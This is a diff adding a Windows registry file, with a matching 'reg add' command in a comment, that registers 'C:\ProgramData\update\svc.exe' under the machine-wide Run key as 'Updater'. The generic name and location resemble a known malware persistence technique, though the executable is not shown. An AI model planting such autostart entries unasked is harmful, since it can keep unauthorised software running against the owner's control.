@@ -1,0 +1,6 @@
+Windows Registry Editor Version 5.00
+
+; applied via: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\ProgramData\update\svc.exe /f
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"Updater"="C:\\ProgramData\\update\\svc.exe"
